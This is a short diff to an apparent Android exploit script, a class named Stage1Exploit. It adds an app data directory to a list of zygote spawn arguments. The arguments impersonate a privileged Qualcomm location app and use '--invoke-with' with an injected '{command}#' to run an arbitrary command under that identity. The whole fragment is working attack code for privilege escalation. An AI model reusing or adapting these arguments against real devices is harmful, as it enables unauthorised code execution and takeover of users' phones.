@@ -193,6 +193,7 @@ class Stage1Exploit:
             "--runtime-args",
             "--seinfo=platform:isPrivApp:location_app:targetSdkVersion=28:complete",
             "--nice-name=com.qualcomm.location.XT",
+            "--app-data-dir=/data/data/com.qualcomm.location.XT",
             "--runtime-flags=1",
             "--invoke-with",
             f"{command}#",
